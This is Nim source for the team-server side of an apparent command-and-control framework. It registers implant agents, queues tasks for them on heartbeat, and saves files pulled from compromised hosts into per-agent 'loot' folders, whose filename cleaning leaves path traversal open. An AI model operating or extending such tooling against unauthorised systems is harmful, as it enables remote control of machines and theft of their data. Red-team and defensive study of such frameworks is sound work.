import terminal, strformat, strutils, sequtils, tables, times, system, std/[dirs, paths]

import ../globals
import ../db/database
import ../protocol/packer
import ../core/logger
import ../event/send
import ../../common/[types, utils, serialize]

#[
  Agent API
  Functions relevant for dealing with the agent API, such as registering new agents, querying tasks and posting results
]#
proc register*(registrationData: seq[byte]): bool = 

    # The following line is required to be able to use the `cq` global variable for console output
    {.cast(gcsafe).}:

        try:
            let agent: Agent = cq.deserializeNewAgent(registrationData)

            # Validate that listener exists        
            if not cq.dbListenerExists(agent.listenerId.toUpperAscii): 
                cq.error(fmt"{agent.ip} attempted to register to non-existent listener: {agent.listenerId}.", "\n")
                return false

            # Store agent in database
            if not cq.dbStoreAgent(agent): 
                cq.error(fmt"Failed to insert agent {agent.agentId} into database.", "\n")
                return false

            # Create log directory
            if not cq.makeAgentLogDirectory(agent.agentId):
                cq.error("Failed to create log directory.", "\n")
                return false

            cq.agents[agent.agentId] = agent

            cq.info("Agent ", fgYellow, styleBright, agent.agentId, resetStyle, " connected to listener ", fgGreen, styleBright, agent.listenerId, resetStyle, ": ", fgYellow, styleBright, fmt"{agent.username}@{agent.hostname}", "\n") 
            
            cq.client.sendAgent(agent)
            cq.client.sendEventlogItem(LOG_INFO_SHORT, fmt"Agent {agent.agentId} connected to listener {agent.listenerId}.")

            return true
        
        except CatchableError as err:
            cq.error(err.msg) 
            return false

proc getTasks*(heartbeat: seq[byte]): seq[seq[byte]] = 

    {.cast(gcsafe).}:

        try:
            # Deserialize checkin request to obtain agentId and listenerId 
            let 
                request: Heartbeat = cq.deserializeHeartbeat(heartbeat)
                agentId = Uuid.toString(request.header.agentId)
                listenerId = Uuid.toString(request.listenerId)
                timestamp = request.timestamp

            var tasks: seq[seq[byte]]

            # Check if listener exists
            if not cq.dbListenerExists(listenerId): 
                cq.error(fmt"Task-retrieval request made to non-existent listener: {listenerId}.", "\n")
                raise newException(ValueError, "Invalid listener.")

            # Check if agent exists
            if not cq.dbAgentExists(agentId): 
                cq.error(fmt"Task-retrieval request made to non-existent agent: {agentId}.", "\n")
                raise newException(ValueError, "Invalid agent.")

            # Update the last check-in date for the accessed agent
            cq.agents[agentId].latestCheckin = cast[int64](timestamp).fromUnix().local()
            cq.client.sendAgentCheckin(agentId)

            # Return tasks
            for task in cq.agents[agentId].tasks.mitems: # Iterate over agents as mutable items in order to modify GMAC tag
                let taskData = cq.serializeTask(task)
                tasks.add(taskData)
            
            return tasks

        except CatchableError as err:
            cq.error(err.msg) 
            return @[]

proc handleResult*(resultData: seq[byte]) = 

    {.cast(gcsafe).}:

        try:
            let
                taskResult = cq.deserializeTaskResult(resultData) 
                taskId = Uuid.toString(taskResult.taskId)
                agentId = Uuid.toString(taskResult.header.agentId)

            cq.info(fmt"{$resultData.len} bytes received.")
            
            # Update task queue to include all tasks, except the one that was just completed
            case cast[StatusType](taskResult.status):
            of STATUS_COMPLETED:
                cq.success(fmt"Task {taskId} completed.")
                cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)
            of STATUS_FAILED: 
                cq.error(fmt"Task {taskId} failed.")
                cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)
            of STATUS_IN_PROGRESS: 
                discard

            case cast[ResultType](taskResult.resultType):
            of RESULT_STRING:
                if int(taskResult.length) > 0: 
                    cq.info("Output:")
                    # Split result string on newline to keep formatting
                    for line in Bytes.toString(taskResult.data).split("\n"):
                        cq.output(line)

            of RESULT_BINARY:
                # Write binary data to a file 
                # A binary result packet consists of the filename and file contents, both prefixed with their respective lengths as a uint32 value, unless it is fragmented
                var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
                let 
                    fileName = unpacker.getDataWithLengthPrefix().replace("\\", "_").replace(":", "") # Replace path characters for better storage of downloaded files            
                    fileBytes = unpacker.getDataWithLengthPrefix()

                # Create loot directory for the agent
                createDir(cast[Path](fmt"{CONQUEST_ROOT}/data/loot/{agentId}"))
                let downloadPath = fmt"{CONQUEST_ROOT}/data/loot/{agentId}/{fileName}"

                writeFile(downloadPath, fileBytes)

                cq.success(fmt"File downloaded to {downloadPath} ({$fileBytes.len()} bytes).", "\n")

            of RESULT_NO_OUTPUT:
                cq.output()
            
        except CatchableError as err:
            cq.error(err.msg, "\n")  
